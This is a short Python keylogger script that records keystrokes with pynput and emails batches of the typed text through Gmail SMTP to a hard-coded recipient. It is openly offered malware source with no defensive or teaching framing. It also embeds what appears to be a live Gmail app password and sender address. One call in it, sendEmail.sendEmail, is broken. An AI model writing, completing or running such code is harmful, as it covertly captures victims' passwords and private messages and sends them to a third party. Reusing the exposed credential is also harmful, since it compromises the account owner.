import pynput
from pynput.keyboard import Key,Listener
import smtplib, ssl


def sendEmail(message):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "mehmetkzm55@gmail.com"
    password = "bxga vwzx vmaw tbsu"
    receiver_email = "julianjacops@gmail.com"

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

    except Exception as e:
        print(e)
    finally:
        server.quit()

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10 :
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        if key == "Key.capslock":
            k = ""
        if key == "Key.backspace":
            k = ""

        message += k
    sendEmail.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
